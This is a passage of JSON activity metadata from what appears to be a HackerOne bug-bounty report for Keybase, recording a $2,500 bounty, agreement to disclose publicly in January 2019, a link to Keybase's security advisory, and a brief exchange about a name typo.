/keybase","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Keybase"}},"bounty_amount":"2500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"keybase","collaborator":{"username":"votava","url":"/votava"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066217,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-01-30T18:13:26.820Z","updated_at":"2019-01-30T18:13:26.820Z","first_to_agree":true,"actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066236,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-01-30T18:15:40.332Z","updated_at":"2019-01-30T18:15:40.332Z","actor":{"username":"votava","cleared":false,"url":"/votava","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4066237,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-01-30T18:15:40.392Z","updated_at":"2019-01-30T18:15:40.392Z","actor":{"username":"votava","cleared":false,"url":"/votava","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4066286,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We posted this security update: https://keybase.io/docs/secadv/kb004","automated_response":false,"created_at":"2019-01-30T18:21:41.490Z","updated_at":"2019-01-30T18:21:41.490Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066289,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"BTW: You have typo in my surname :).","automated_response":false,"created_at":"2019-01-30T18:22:35.410Z","updated_at":"2019-01-30T18:22:35.410Z","actor":{"username":"votava","cleared":false,"url":"/votava","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4066714,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry about that, it's now fixed!","automated_response":false,"created_at":"2019-01-30T18:57:03.587Z","updated_at":"2019-01-30T18:57:03.587Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}